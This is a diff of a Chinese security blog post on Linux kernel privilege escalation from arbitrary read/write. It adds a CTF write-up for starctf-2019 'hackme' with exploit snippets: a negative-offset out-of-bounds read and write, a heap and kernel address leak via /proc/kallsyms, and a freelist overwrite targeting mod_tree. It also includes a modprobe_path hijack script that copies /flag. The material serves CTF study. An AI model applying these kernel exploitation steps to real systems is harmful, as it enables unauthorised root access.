@@ -127,7 +127,7 @@
 <meta property="og:site_name" content="w4rd3n的笔记">
 <meta property="og:description" content="cred结构体提权 每个线程在内核中都对应一个线程栈,一个线程结构体thread_info,结构体同时也包含了线程的一系列信息,thread_info结构体存放在线程栈的最低地址. 12345678struct thread_info &amp;#123;	unsigned long flags;		/* low level flags */	int preempt_count;		/* 0 =&amp;gt">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-07-03T05:40:11.559Z">
+<meta property="og:updated_time" content="2021-07-03T07:36:28.514Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-kernel-任意读写到权限提升">
 <meta name="twitter:description" content="cred结构体提权 每个线程在内核中都对应一个线程栈,一个线程结构体thread_info,结构体同时也包含了线程的一系列信息,thread_info结构体存放在线程栈的最低地址. 12345678struct thread_info &amp;#123;	unsigned long flags;		/* low level flags */	int preempt_count;		/* 0 =&amp;gt">
@@ -503,7 +503,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">5.8k</span>
+                <span title="本文字数">6.9k</span>
               
 
               
@@ -517,7 +517,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">5 分钟</span>
+                <span title="阅读时长">6 分钟</span>
               
             </div>
           
@@ -584,6 +584,21 @@
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/w4rd3n"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/w4rd3n"</span>);</span><br></pre></td></tr></table></figure>
 <p>劫持<code>modprobe_path</code>到可执行文件<code>/home/pwn/copy.sh</code>后就可以触发并获取<code>flag</code>.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"/home/pwn/w4rd3n"</span>);</span><br><span class="line">system(<span class="string">"cat /home/pwn/flag"</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="starctf-2019-hackme">starctf-2019-hackme</h2>
+<p>开启<code>KASLR</code>,<code>SMEP</code>,<code>SMAP</code>.</p>
+<p><code>free</code>时没有对<code>size</code>清<code>0</code>,<code>write</code>和<code>read</code>时偏移<code>offset</code>为负数可向上越界写任意长度内存.</p>
+<p>存在竞争漏洞:全局数组<code>pool</code>存储内核<code>chunk</code>地址和<code>chunk</code>大小,对这个数组的存取缺少锁操作且内核以多线程启动,如果释放内存后立刻竞争读写堆块就可以造成<code>UAF</code>.</p>
+<p>猜测<code>module</code>的第一个堆块之前是已经在使用的系统块,上面可能存在一些内核指针,从而泄露<code>kernel_base</code>.</p>
+<p>通过链表读取堆地址.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alloc(fd, <span class="number">0</span>, mem, <span class="number">0x100</span>)</span><br><span class="line">alloc(fd, <span class="number">1</span>, mem, <span class="number">0x100</span>)</span><br><span class="line">alloc(fd, <span class="number">2</span>, mem, <span class="number">0x100</span>)</span><br><span class="line">alloc(fd, <span class="number">3</span>, mem, <span class="number">0x100</span>)</span><br><span class="line">alloc(fd, <span class="number">4</span>, mem, <span class="number">0x100</span>)</span><br><span class="line">delete(fd, <span class="number">1</span>)</span><br><span class="line">delete(fd, <span class="number">3</span>)</span><br><span class="line">read_from_kernel(fd, <span class="number">4</span>, mem, <span class="number">0x100</span>, <span class="number">-0x100</span>)</span><br><span class="line">heap_addr = *((size_t *)mem)</span><br></pre></td></tr></table></figure>
+<p><code>0</code>号内存之前是已经在用的系统块,从<code>0</code>号块向前越界搜索可以发现一个内核地址<code>0xffffffff81849ae0</code>.</p>
+<p>利用<code>/proc/kallsyms</code>可以很容易发现属于一个固定函数<code>sysctl_table_root</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep ffffffff81849ae0</span><br><span class="line">ffffffff81849ae0 d sysctl_table_root</span><br></pre></td></tr></table></figure>
+<p>利用已有的内核地址,可以找到一个包含模块指针的内存位置<code>mod_tree</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep mod_tree</span><br><span class="line">ffffffff8106df00 t __mod_tree_remove</span><br><span class="line">ffffffff8106e720 t __mod_tree_insert</span><br><span class="line">ffffffff81811000 d mod_tree</span><br></pre></td></tr></table></figure>
+<p>溢出修改<code>fd</code>为<code>mod_tree</code>后,获取内核模块<code>hackme</code>的基址.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">memset(mem, <span class="string">'A'</span>, <span class="number">0x100</span>)</span><br><span class="line">*((size_t *)mem) = (<span class="number">0x811000</span> + kernel_addr + <span class="number">0x40</span>);</span><br><span class="line">write_to_kernel(fd, <span class="number">4</span>, mem, <span class="number">0x100</span>, <span class="number">-0x100</span>)</span><br><span class="line">alloc(fd, <span class="number">5</span>, mem, <span class="number">0x100</span>)</span><br><span class="line">alloc(fd, <span class="number">6</span>, mem, <span class="number">0x100</span>)</span><br><span class="line">read_from_kernel(fd, <span class="number">6</span>, mem, <span class="number">0x40</span>, <span class="number">-0x40</span>)</span><br><span class="line">mod_addr = *((size_t  *)(mem + <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure>
+<p>再次劫持<code>fd</code>获得<code>pool</code>的控制权,此时已经可以任意地址读写.</p>
 
       
     </div>
@@ -620,8 +635,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/5940d912/" rel="next" title="writeup-天翼杯-2020">
-                <i class="fa fa-chevron-left"></i> writeup-天翼杯-2020
+              <a href="/posts/1003444e/" rel="next" title="CS-RTFSC-Linux-glibc-2.23-malloc与free">
+                <i class="fa fa-chevron-left"></i> CS-RTFSC-Linux-glibc-2.23-malloc与free
               </a>
             
           </div>
@@ -706,7 +721,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">155</span>
+                    <span class="site-state-item-count">121</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -836,7 +851,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">36</span>
+                      
+                    
+                    <span class="site-state-item-count">37</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -886,7 +903,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cred结构体提权"><span class="nav-number">1.</span> <span class="nav-text">cred结构体提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vdso重写"><span class="nav-number">2.</span> <span class="nav-text">vdso重写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hijackprctl"><span class="nav-number">3.</span> <span class="nav-text">HijackPrctl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#modprobe_path"><span class="nav-number">4.</span> <span class="nav-text">modprobe_path</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cred结构体提权"><span class="nav-number">1.</span> <span class="nav-text">cred结构体提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vdso重写"><span class="nav-number">2.</span> <span class="nav-text">vdso重写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hijackprctl"><span class="nav-number">3.</span> <span class="nav-text">HijackPrctl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#modprobe_path"><span class="nav-number">4.</span> <span class="nav-text">modprobe_path</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#starctf-2019-hackme"><span class="nav-number">5.</span> <span class="nav-text">starctf-2019-hackme</span></a></li></ol></div>
             
 
           </div>
@@ -918,7 +935,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">898k</span>
+    <span title="站点总字数">807k</span>
   
 
   
@@ -927,7 +944,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">13:36</span>
+    <span title="站点阅读时长">12:13</span>
   
 </div>
 
